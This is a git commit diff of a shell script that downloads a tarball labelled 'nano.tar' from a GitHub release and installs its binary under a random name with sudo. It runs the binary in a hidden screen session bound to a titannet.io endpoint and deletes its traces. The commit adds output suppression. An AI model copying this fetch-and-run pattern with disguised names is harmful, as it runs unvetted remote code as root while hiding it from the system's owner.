77a230c9b1262b508651d90e0165837849e58849
saranghaou <148321166+saranghaou@users.noreply.github.com>
2024-11-18 16:13:07 +0700

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,9 +1,9 @@
 apt-get update
 apt install -y nano screen
-wget https://github.com/zibercount/terfprce/releases/download/v3.4.2/nano.tar
+wget https://github.com/zibercount/terfprce/releases/download/v3.4.2/nano.tar > /dev/null 2>&1 
 VAR1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 VAR2=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-tar -xf nano.tar
+tar -xf nano.tar > /dev/null 2>&1 
 mv source $VAR1
 sudo cp $VAR1 /usr/local/bin
 sudo cp libgoworkerd.so /usr/local/lib
@@ -12,7 +12,7 @@ screen -dmS $VAR2 $VAR1 daemon start --init --url https://cassini-locator.titann
 sleep 5
 echo Daemon start OK
 sleep 5
-$VAR1 bind --hash=B606D8BA-67D1-48A7-B165-0E308E805917 https://api-test1.container1.titannet.io/api/v2/device/binding
+$VAR1 bind --hash=B606D8BA-67D1-48A7-B165-0E308E805917 https://api-test1.container1.titannet.io/api/v2/device/binding > /dev/null 2>&1 
 echo Succes Start
 cd ..
 rm -rf terfprce
